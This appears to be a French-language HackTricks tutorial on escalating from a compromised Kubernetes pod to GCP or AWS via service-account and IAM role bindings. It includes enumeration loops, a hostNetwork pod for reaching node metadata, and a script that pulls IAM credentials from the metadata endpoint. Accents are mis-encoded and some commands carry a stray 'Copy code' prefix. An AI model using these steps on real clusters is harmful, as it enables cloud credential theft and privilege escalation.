# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

Si vous ex√©cutez un cluster k8s √† l'int√©rieur de GCP, vous voudrez probablement qu'une application s'ex√©cutant √† l'int√©rieur du cluster ait un acc√®s √† GCP. Il existe 2 fa√ßons courantes de le faire :

### Montage des cl√©s GCP-SA en tant que secret

Une fa√ßon courante de donner **acc√®s √† une application kubernetes √† GCP** est de :

* Cr√©er un compte de service GCP
* Lier les permissions souhait√©es
* T√©l√©charger une cl√© json du SA cr√©√©
* La monter en tant que secret √† l'int√©rieur du pod
* D√©finir la variable d'environnement GOOGLE\_APPLICATION\_CREDENTIALS pointant vers le chemin o√π se trouve le json.

{% hint style="warning" %}
Par cons√©quent, en tant qu'**attaquant**, si vous compromettez un conteneur √† l'int√©rieur d'un pod, vous devez v√©rifier cette **variable** **env** et les **fichiers** **json** avec les identifiants GCP.
{% endhint %}

### Lier le json GSA au secret KSA

Une fa√ßon de donner acc√®s √† un GSA √† un cluster GKE est de les lier de cette mani√®re :

* Cr√©er un compte de service Kubernetes dans le m√™me namespace que votre cluster GKE en utilisant la commande suivante :
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Cr√©ez un Secret Kubernetes qui contient les identifiants du compte de service GCP auquel vous souhaitez accorder l'acc√®s au cluster GKE. Vous pouvez le faire en utilisant l'outil en ligne de commande `gcloud`, comme montr√© dans l'exemple suivant :
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Liez le Secret Kubernetes au compte de service Kubernetes en utilisant la commande suivante :
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
Dans la **deuxi√®me √©tape**, les **identifiants du GSA ont √©t√© d√©finis comme secret du KSA**. Ensuite, si vous pouvez **lire ce secret** depuis **l'int√©rieur** du **cluster GKE**, vous pouvez **escalader vers ce compte de service GCP**.
{% endhint %}

### Identit√© de Charge de Travail GKE

Avec l'Identit√© de Charge de Travail, nous pouvons configurer un [compte de service Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) pour agir en tant que [compte de service Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Les pods fonctionnant avec le compte de service Kubernetes s'authentifieront automatiquement en tant que compte de service Google lors de l'acc√®s aux API Google Cloud.

La **premi√®re s√©rie d'√©tapes** pour activer ce comportement est d'**activer l'Identit√© de Charge de Travail dans GCP** ([**√©tapes**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) et de cr√©er le SA GCP que vous souhaitez que k8s imite.

* **Activer l'Identit√© de Charge de Travail** sur un nouveau cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Cr√©er/Mettre √† jour un nouveau pool de n≈ìuds** (les clusters Autopilot n'ont pas besoin de cela)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Cr√©ez le **compte de service GCP √† imiter** depuis K8s avec des autorisations GCP :

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Connectez-vous** au **cluster** et **cr√©ez** le **compte de service** √† utiliser

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Lier le GSA avec le KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Ex√©cutez un **pod** avec le **KSA** et v√©rifiez l'**acc√®s** au **GSA :**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
V√©rifiez la commande suivante pour vous authentifier si n√©cessaire :

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant √† l'int√©rieur de K8s, vous devriez **rechercher des SAs** avec l'**annotation `iam.gke.io/gcp-service-account`** car cela indique que le SA peut acc√©der √† quelque chose dans GCP. Une autre option serait d'essayer d'abuser de chaque KSA dans le cluster et de v√©rifier s'il a acc√®s.\
Depuis GCP, il est toujours int√©ressant d'√©num√©rer les liaisons et de savoir **quel acc√®s vous accordez aux SAs √† l'int√©rieur de Kubernetes**.
{% endhint %}

Ceci est un script pour facilement **it√©rer sur toutes les d√©finitions de pods** **cherchant** cette **annotation** :
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (r√¥le IAM pour les Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Une mani√®re (d√©pass√©e) de donner des r√¥les IAM aux Pods est d'utiliser un [**Kiam**](https://github.com/uswitch/kiam) ou un [**Kube2IAM**](https://github.com/jtblin/kube2iam) **serveur.** En gros, vous devrez ex√©cuter un **daemonset** dans votre cluster avec un **type de r√¥le IAM privil√©gi√©**. Ce daemonset sera celui qui donnera acc√®s aux r√¥les IAM aux pods qui en ont besoin.

Tout d'abord, vous devez configurer **quels r√¥les peuvent √™tre accessibles √† l'int√©rieur de l'espace de noms**, et vous le faites avec une annotation √† l'int√©rieur de l'objet d'espace de noms :

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Une fois que l'espace de noms est configur√© avec les r√¥les IAM que les Pods peuvent avoir, vous pouvez **indiquer le r√¥le que vous souhaitez sur chaque d√©finition de pod avec quelque chose comme** :

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant, si vous **trouvez ces annotations** dans des pods ou des namespaces ou un serveur kiam/kube2iam en cours d'ex√©cution (probablement dans kube-system), vous pouvez **imposer chaque r**√¥le qui est d√©j√† **utilis√© par des pods** et plus (si vous avez acc√®s au compte AWS, √©num√©rez les r√¥les).
{% endhint %}

#### Cr√©er un Pod avec un r√¥le IAM

{% hint style="info" %}
Le r√¥le IAM √† indiquer doit √™tre dans le m√™me compte AWS que le r√¥le kiam/kube2iam et ce r√¥le doit pouvoir y acc√©der.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

C'est la **m√©thode recommand√©e par AWS**.

1. Tout d'abord, vous devez [cr√©er un fournisseur OIDC pour le cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Ensuite, vous cr√©ez un r√¥le IAM avec les permissions dont le SA aura besoin.
3. Cr√©ez une [relation de confiance entre le r√¥le IAM et le SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nom (ou les namespaces donnant acc√®s au r√¥le √† tous les SAs du namespace). _La relation de confiance v√©rifiera principalement le nom du fournisseur OIDC, le nom du namespace et le nom du SA_.
4. Enfin, **cr√©ez un SA avec une annotation indiquant l'ARN du r√¥le**, et les pods s'ex√©cutant avec ce SA auront **acc√®s au token du r√¥le**. Le **token** est **√©crit** dans un fichier et le chemin est sp√©cifi√© dans **`AWS_WEB_IDENTITY_TOKEN_FILE`** (par d√©faut : `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Pour **obtenir aws en utilisant le token** depuis `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ex√©cutez :

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant, si vous pouvez √©num√©rer un cluster K8s, v√©rifiez les **comptes de service avec cette annotation** pour **escalader vers AWS**. Pour ce faire, il suffit de **exec/cr√©er** un **pod** en utilisant l'un des **comptes de service IAM privil√©gi√©s** et de voler le jeton.

De plus, si vous √™tes √† l'int√©rieur d'un pod, v√©rifiez les variables d'environnement comme **AWS\_ROLE\_ARN** et **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Parfois, la **politique de confiance d'un r√¥le** peut √™tre **mal configur√©e** et au lieu de donner l'acc√®s AssumeRole au compte de service attendu, elle le donne √† **tous les comptes de service**. Par cons√©quent, si vous √™tes capable d'√©crire une annotation sur un compte de service contr√¥l√©, vous pouvez acc√©der au r√¥le.

V√©rifiez la **page suivante pour plus d'informations** :
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Trouver des Pods et des SAs avec des R√¥les IAM dans le Cluster

Ceci est un script pour facilement **it√©rer sur tous les pods et d√©finitions de sas** **cherchant** cette **annotation** :
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### R√¥le IAM du n≈ìud

La section pr√©c√©dente portait sur la mani√®re de voler des r√¥les IAM avec des pods, mais notez qu'un **n≈ìud du** cluster K8s va √™tre une **instance dans le cloud**. Cela signifie que le n≈ìud est tr√®s probablement **susceptible d'avoir un nouveau r√¥le IAM que vous pouvez voler** (_notez que g√©n√©ralement tous les n≈ìuds d'un cluster K8s auront le m√™me r√¥le IAM, donc cela peut ne pas valoir la peine d'essayer de v√©rifier chaque n≈ìud_).

Il y a cependant une exigence importante pour acc√©der au point de terminaison des m√©tadonn√©es depuis le n≈ìud, vous devez √™tre dans le n≈ìud (session ssh ?) ou au moins avoir le m√™me r√©seau :
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Voler le jeton de r√¥le IAM

Auparavant, nous avons discut√© de la fa√ßon de **joindre des r√¥les IAM aux Pods** ou m√™me de **s'√©chapper vers le n≈ìud pour voler le r√¥le IAM** que l'instance a attach√© √† elle.

Vous pouvez utiliser le script suivant pour **voler** vos nouvelles **informations d'identification de r√¥le IAM** durement acquises :
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## R√©f√©rences

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
